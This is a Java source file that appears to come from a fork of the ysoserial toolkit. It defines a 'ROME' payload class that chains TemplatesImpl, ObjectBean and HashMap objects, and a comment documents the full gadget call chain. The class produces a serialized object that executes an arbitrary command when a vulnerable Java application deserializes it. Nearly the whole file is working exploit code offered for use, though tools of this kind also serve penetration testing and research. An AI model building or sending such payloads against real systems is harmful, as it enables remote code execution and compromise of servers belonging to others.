package dogeser.payloads;


import javax.xml.transform.Templates;

import com.sun.syndication.feed.impl.ObjectBean;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.PayloadRunner;

/**
 *
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 *
 */
@Dependencies("rome:rome:1.0")
@dogeser.payloads.annotation.Authors({ Authors.MBECHLER })
public class ROME implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        Object o = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ROME.class, args);
    }

}
